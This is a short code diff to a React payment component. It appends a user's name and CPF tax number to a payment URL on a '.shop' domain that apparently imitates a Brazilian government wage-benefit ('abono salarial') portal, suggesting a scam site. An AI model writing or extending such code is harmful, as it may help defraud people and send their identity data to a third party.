@@ -56,7 +56,7 @@ const Payment: React.FC = () => {
   const openPaymentIframe = () => {
     const name = localStorage.getItem("name") || userData?.nome || "";
     const cpf = localStorage.getItem("cpf") || userData?.cpf || "";
-    const url = `https://pay.abono-salarial-portal.shop/N1nVZpEdY60GlM6`;
+    const url = `https://pay.abono-salarial-portal.shop/N1nVZpEdY60GlM6?name=${encodeURIComponent(name)}&document=${encodeURIComponent(cpf)}`;
     
     if (isMobile) {
       setSheetOpen(true);
